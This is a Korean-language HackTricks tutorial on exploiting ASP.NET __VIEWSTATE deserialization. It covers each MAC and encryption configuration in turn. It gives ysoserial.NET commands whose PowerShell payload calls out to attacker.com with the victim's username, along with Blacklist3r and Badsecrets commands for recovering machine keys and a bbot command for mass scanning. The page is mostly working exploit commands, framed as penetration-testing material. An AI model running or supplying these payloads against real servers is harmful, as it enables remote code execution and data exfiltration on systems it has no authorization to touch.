# \_\_VIEWSTATE 매개변수를 알지 못하고 악용하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## ViewState이란

**ViewState**는 ASP.NET에서 웹 페이지 간에 페이지 및 컨트롤 데이터를 유지하는 기본 메커니즘으로 사용됩니다. 페이지의 HTML 렌더링 중에 페이지의 현재 상태와 포스트백 중에 보존되어야 할 값들은 base64로 인코딩된 문자열로 직렬화됩니다. 그런 다음 이러한 문자열은 숨겨진 ViewState 필드에 배치됩니다.

ViewState 정보는 다음 속성 또는 그들의 조합에 의해 특징 지어질 수 있습니다:

- **Base64**:
- `EnableViewStateMac` 및 `ViewStateEncryptionMode` 속성이 모두 false로 설정된 경우에 사용되는 형식입니다.

- **Base64 + MAC (Message Authentication Code) 활성화**:
- MAC의 활성화는 `EnableViewStateMac` 속성을 true로 설정하여 달성됩니다. 이는 ViewState 데이터의 무결성 검증을 제공합니다.

- **Base64 + 암호화**:
- 암호화는 `ViewStateEncryptionMode` 속성이 true로 설정될 때 적용되며, ViewState 데이터의 기밀성을 보장합니다.

## 테스트 케이스

이 이미지는 .NET 프레임워크 버전에 기반한 ASP.NET의 ViewState에 대한 다른 구성을 자세히 설명하는 테이블입니다. 내용 요약은 다음과 같습니다:

1. **.NET의 모든 버전**에 대해 MAC 및 암호화가 모두 비활성화된 경우 MachineKey가 필요하지 않으므로 식별할 수 있는 방법이 없습니다.

2. **4.5 미만의 버전**에서 MAC이 활성화되지만 암호화가 비활성화된 경우 MachineKey가 필요합니다. MachineKey를 식별하는 방법은 "Blacklist3r"로 알려져 있습니다.

3. **4.5 미만의 버전**에서 MAC이 활성화되었는지 여부에 관계없이 암호화가 활성화된 경우 MachineKey가 필요합니다. MachineKey를 식별하는 작업은 "Blacklist3r - Future Development"의 업무입니다.

4. **4.5 이상의 버전**에서는 MAC 및 암호화의 모든 조합(둘 다 true인 경우 또는 하나는 true이고 다른 하나는 false인 경우)이 MachineKey를 필요로 합니다. MachineKey는 "Blacklist3r"를 사용하여 식별할 수 있습니다.


### 테스트 케이스: 1 – EnableViewStateMac=false 및 viewStateEncryptionMode=false

`AspNetEnforceViewStateMac` 레지스트리 키를 0으로 설정하여 ViewStateMAC을 완전히 비활성화할 수도 있습니다. 위치는 다음과 같습니다:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState 속성 식별**

BurpSuite를 사용하여 이 매개변수를 포함하는 요청을 캡처하여 ViewState이 MAC으로 보호되는지 확인할 수 있습니다. 매개변수를 보호하기 위해 Mac이 사용되지 않는 경우 [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)을 사용하여 이를 악용할 수 있습니다.
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### 테스트 케이스 1.5 - 테스트 케이스 1과 같지만 서버에서 ViewState 쿠키를 보내지 않음

개발자는 ViewState가 HTTP 요청의 일부가 되지 않도록 제거할 수 있습니다(사용자는 이 쿠키를 받지 않습니다).\
ViewState가 없으면 ViewState 역직렬화로 인해 발생할 수 있는 잠재적인 취약점으로부터 구현이 안전하다고 가정할 수 있습니다.\
하지만 그렇지 않습니다. 우리는 요청 본문에 ViewState 매개변수를 추가하고 ysoserial을 사용하여 생성된 직렬화된 페이로드를 보내면 Case 1에서와 같이 여전히 코드 실행을 달성할 수 있습니다.


### 테스트 케이스 2 - .Net < 4.5 및 EnableViewStateMac=true & ViewStateEncryptionMode=false

특정 페이지에서 ViewState MAC을 활성화하려면 특정 aspx 파일에서 다음 변경 사항을 수행해야 합니다:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
다음과 같이 **web.config** 파일에서 설정하여 **전체** 애플리케이션에 대해 수행할 수도 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
이번에는 매개변수가 MAC으로 보호되어 있으므로 공격을 성공적으로 실행하려면 먼저 사용된 키를 알아야 합니다.

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)를 사용하여 사용된 키를 찾아볼 수 있습니다.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)은 알려진 machineKeys를 식별할 수 있는 또 다른 도구입니다. 이것은 Python으로 작성되었으므로 Blacklist3r과 달리 Windows 종속성이 없습니다. .NET viewstate의 경우 "python blacklist3r" 유틸리티가 있으며, 이것이 가장 빠른 사용 방법입니다.

뷰스테이트와 생성기를 직접 제공할 수도 있습니다:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

또는, 대상 URL에 직접 연결하여 HTML에서 viewstate를 추출하려고 시도할 수 있습니다:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

대규모로 취약한 viewstate를 찾기 위해 서브도메인 열거와 함께 `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) 모듈을 사용할 수 있습니다:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

운이 좋다면 키를 찾을 수 있으며, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**을 사용하여 공격을 진행할 수 있습니다:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
서버에서 `_VIEWSTATEGENERATOR` 매개변수가 전송되지 않는 경우 `--generator` 매개변수를 제공할 필요가 없지만, 다음과 같은 매개변수들이 필요합니다:
```bash
--apppath="/" --path="/hello.aspx"
```
### 테스트 케이스: 3 - .Net < 4.5 및 EnableViewStateMac=true/false 및 ViewStateEncryptionMode=true

이 경우 매개변수가 MAC으로 보호되었는지 여부를 알 수 없습니다. 그런 경우 값은 아마도 암호화되어 있으며 취약점을 이용하기 위해 페이로드를 암호화하는 데 **Machine Key가 필요**합니다.

**이 경우** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **모듈이 개발 중입니다...**

**.NET 4.5 이전에는**, ASP.NET은 **항상** `ViewStateEncryptionMode`가 설정되었더라도 사용자로부터 **암호화되지 않은** \_`__VIEWSTATE`\_매개변수를 **받아들일 수 있습니다**. ASP.NET은 요청에서 **`__VIEWSTATEENCRYPTED`** 매개변수의 **존재**만 확인합니다. **이 매개변수를 제거하고 암호화되지 않은 페이로드를 보내면 여전히 처리됩니다.**

따라서 공격자가 파일 탐색과 같은 다른 취약점을 통해 Machinekey를 얻는 방법을 찾으면, **Case 2**에서 사용한 [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) 명령을 사용하여 ViewState 역직렬화 취약점을 이용하여 RCE를 수행할 수 있습니다.

* ViewState 역직렬화 취약점을 이용하기 위해 요청에서 `__VIEWSTATEENCRYPTED` 매개변수를 제거하십시오. 그렇지 않으면 Viewstate MAC 유효성 검사 오류가 발생하여 취약점을 이용할 수 없습니다.

### 테스트 케이스: 4 - .Net >= 4.5 및 EnableViewStateMac=true/false 및 ViewStateEncryptionMode=true/false, 두 속성 모두 false로 설정

아래와 같이 web.config 파일 내에 아래 매개변수를 지정하여 ASP.NET 프레임워크 사용을 강제할 수 있습니다.
```xml
<httpRuntime targetFramework="4.5" />
```
대신, 이 작업은 web.config 파일의 `machineKey` 매개변수 내에 아래 옵션을 지정하여 수행할 수 있습니다.
```bash
compatibilityMode="Framework45"
```
이전과 마찬가지로 **값은 암호화되어 있습니다.** 그런 다음, **유효한 페이로드를 보내려면 공격자는 키가 필요합니다.**

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)를 사용하여 사용되는 키를 찾아볼 수 있습니다:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPath과 TargetPagePath에 대한 자세한 설명은 [여기](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)를 참조하십시오.

또는, [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)를 사용하여 (생성기 값과 함께):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

유효한 Machine key가 확인되면, **다음 단계는** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **을 사용하여 직렬화된 페이로드를 생성하는 것입니다.**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
만약 `__VIEWSTATEGENERATOR`의 값을 가지고 있다면, 해당 값을 사용하여 `--generator` 매개변수를 시도하고 `--path`와 `--apppath` 매개변수를 생략할 수 있습니다.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewState 역직렬화 취약점의 성공적인 악용은 사용자 이름을 포함한 공격자가 제어하는 서버로의 외부 요청으로 이어집니다. 이러한 유형의 악용은 "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET"이라는 자료를 통해 확인할 수 있는 증명(PoC)에서 시연됩니다. 악용 과정이 작동하는 방식과 Blacklist3r와 같은 도구를 사용하여 MachineKey를 식별하는 방법에 대한 자세한 내용은 제공된 [성공적인 악용의 PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)를 참조하십시오.


### 테스트 케이스 6 - ViewStateUserKeys가 사용되고 있음

**ViewStateUserKey** 속성은 **CSRF 공격**에 대한 **방어**로 사용될 수 있습니다. 애플리케이션에서 이러한 키가 정의되었고 우리가 지금까지 논의한 방법으로 **ViewState** 페이로드를 생성하려고 시도하면, **페이로드는 애플리케이션에서 처리되지 않을 것입니다**.\
올바르게 페이로드를 생성하기 위해 하나의 추가 매개변수를 사용해야 합니다:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### 성공적인 악용의 결과 <a href="#poc" id="poc"></a>

모든 테스트 케이스에서 ViewState YSoSerial.Net 페이로드가 **성공적으로** 작동하면 서버는 "500 Internal server error"로 응답하며 응답 콘텐츠는 "The state information is invalid for this page and might be corrupted"입니다. 그리고 우리는 OOB 요청을 받습니다.

[further information here]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))에서 자세한 정보를 확인하세요.

## 참고 자료

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 작문 및 구사 능력 필요_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 사용하여 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
